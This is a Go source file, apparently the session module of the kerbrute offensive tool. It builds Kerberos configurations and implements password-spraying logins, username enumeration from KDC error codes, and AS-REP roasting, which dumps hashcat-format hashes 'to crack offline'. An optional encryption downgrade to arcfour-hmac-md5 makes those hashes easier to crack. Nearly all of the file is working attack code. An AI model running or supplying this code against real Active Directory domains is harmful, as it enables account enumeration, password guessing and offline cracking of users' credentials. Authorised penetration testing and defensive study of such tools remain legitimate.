package session

import (
	"fmt"
	"html/template"
	"os"
	"strings"

	"github.com/ropnop/kerbrute/util"

	"github.com/ropnop/gokrb5/v8/iana/errorcode"

	"github.com/ropnop/gokrb5/iana/patype"
	"github.com/ropnop/gokrb5/types"
	kclient "github.com/ropnop/gokrb5/v8/client"
	kconfig "github.com/ropnop/gokrb5/v8/config"
	"github.com/ropnop/gokrb5/v8/messages"
)

const krb5ConfigTemplateDNS = `[libdefaults]
dns_lookup_kdc = true
default_realm = {{.Realm}}
`

const krb5ConfigTemplateKDC = `[libdefaults]
default_realm = {{.Realm}}
[realms]
{{.Realm}} = {
	kdc = {{.DomainController}}
	admin_server = {{.DomainController}}
}
`

type KerbruteSession struct {
	Domain       string
	Realm        string
	Kdcs         map[int]string
	ConfigString string
	Config       *kconfig.Config
	Verbose      bool
	SafeMode     bool
	HashFile     *os.File
	Logger       *util.Logger
}

type KerbruteSessionOptions struct {
	Domain           string
	DomainController string
	Verbose          bool
	SafeMode         bool
	Downgrade        bool
	HashFilename     string
	logger           *util.Logger
}

func NewKerbruteSession(options KerbruteSessionOptions) (k KerbruteSession, err error) {
	if options.Domain == "" {
		return k, fmt.Errorf("domain must not be empty")
	}
	if options.logger == nil {
		logger := util.NewLogger(options.Verbose, "")
		options.logger = &logger
	}
	var hashFile *os.File
	if options.HashFilename != "" {
		hashFile, err = os.OpenFile(options.HashFilename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err != nil {
			return k, err
		}
		options.logger.Log.Infof("Saving any captured hashes to %s", hashFile.Name())
		if !options.Downgrade {
			options.logger.Log.Warningf("You are capturing AS-REPs, but not downgrading encryption. You probably want to downgrade to arcfour-hmac-md5 (--downgrade) to crack them with a user's password instead of AES keys")
		}
	}

	realm := strings.ToUpper(options.Domain)
	configstring := buildKrb5Template(realm, options.DomainController)
	Config, err := kconfig.NewFromString(configstring)
	if options.Downgrade {
		Config.LibDefaults.DefaultTktEnctypeIDs = []int32{23} // downgrade to arcfour-hmac-md5 for crackable AS-REPs
		options.logger.Log.Info("Using downgraded encryption: arcfour-hmac-md5")
	}
	if err != nil {
		panic(err)
	}
	_, kdcs, err := Config.GetKDCs(realm, false)
	if err != nil {
		err = fmt.Errorf("Couldn't find any KDCs for realm %s. Please specify a Domain Controller", realm)
	}
	k = KerbruteSession{
		Domain:       options.Domain,
		Realm:        realm,
		Kdcs:         kdcs,
		ConfigString: configstring,
		Config:       Config,
		Verbose:      options.Verbose,
		SafeMode:     options.SafeMode,
		HashFile:     hashFile,
		Logger:       options.logger,
	}
	return k, err

}

func buildKrb5Template(realm, domainController string) string {
	data := map[string]interface{}{
		"Realm":            realm,
		"DomainController": domainController,
	}
	var kTemplate string
	if domainController == "" {
		kTemplate = krb5ConfigTemplateDNS
	} else {
		kTemplate = krb5ConfigTemplateKDC
	}
	t := template.Must(template.New("krb5ConfigString").Parse(kTemplate))
	builder := &strings.Builder{}
	if err := t.Execute(builder, data); err != nil {
		panic(err)
	}
	return builder.String()
}

func (k KerbruteSession) TestLogin(username, password string) (bool, error) {
	Client := kclient.NewWithPassword(username, k.Realm, password, k.Config, kclient.DisablePAFXFAST(true), kclient.AssumePreAuthentication(true))
	defer Client.Destroy()
	if ok, err := Client.IsConfigured(); !ok {
		return false, err
	}
	err := Client.Login()
	if err == nil {
		return true, err
	}
	success, err := k.TestLoginError(err)
	return success, err
}

func (k KerbruteSession) TestUsername(username string) (string, error) {
	// client here does NOT assume preauthentication (as opposed to the one in TestLogin)

	cl := kclient.NewWithPassword(username, k.Realm, "foobar", k.Config, kclient.DisablePAFXFAST(true))

	req, err := messages.NewASReqForTGT(cl.Credentials.Domain(), cl.Config, cl.Credentials.CName())
	if err != nil {
		fmt.Printf(err.Error())
	}
	b, err := req.Marshal()
	if err != nil {
		return "", err
	}
	rb, err := cl.SendToKDC(b, k.Realm)

	if err == nil {
		// If no error, we actually got an AS REP, meaning user does not have pre-auth required
		var ASRep messages.ASRep
		err = ASRep.Unmarshal(rb)
		if err != nil {
			return "", err
		}
		k.DumpASRepHash(ASRep)
		return "", nil
	}

	e, ok := err.(messages.KRBError)
	if !ok {
		return "", err
	}

	var salt string = ""
	var pas types.PADataSequence
	saltErr := pas.Unmarshal(e.EData)
	if saltErr == nil {
		for _, pa := range pas {
			switch pa.PADataType {
			case patype.PA_PW_SALT:
				salt = string(pa.PADataValue)
			case patype.PA_ETYPE_INFO:
				var eti types.ETypeInfo
				saltErr = eti.Unmarshal(pa.PADataValue)
				if saltErr == nil {
					salt = string(eti[0].Salt)
				}
			case patype.PA_ETYPE_INFO2:
				var et2 types.ETypeInfo2
				saltErr = et2.Unmarshal(pa.PADataValue)
				if saltErr == nil {
					salt = et2[0].Salt
				}
			}
		}
	}

	if salt != "" {
		salt = strings.Replace(salt, strings.ToUpper((cl.Credentials.Domain())), "", 1)
	}

	switch e.ErrorCode {
	case errorcode.KDC_ERR_PREAUTH_REQUIRED:
		return salt, nil
	default:
		return salt, err
	}
}

func (k KerbruteSession) DumpASRepHash(asrep messages.ASRep) {
	hash, err := util.ASRepToHashcat(asrep)
	if err != nil {
		k.Logger.Log.Debugf("[!] Got encrypted TGT for %s, but couldn't convert to hash: %s", asrep.CName.PrincipalNameString(), err.Error())
		return
	}
	k.Logger.Log.Noticef("[+] %s has no pre auth required. Dumping hash to crack offline:\n%s", asrep.CName.PrincipalNameString(), hash)
	if k.HashFile != nil {
		_, err := k.HashFile.WriteString(fmt.Sprintf("%s\n", hash))
		if err != nil {
			k.Logger.Log.Errorf("[!] Error writing hash to file: %s", err.Error())
		}
	}
}
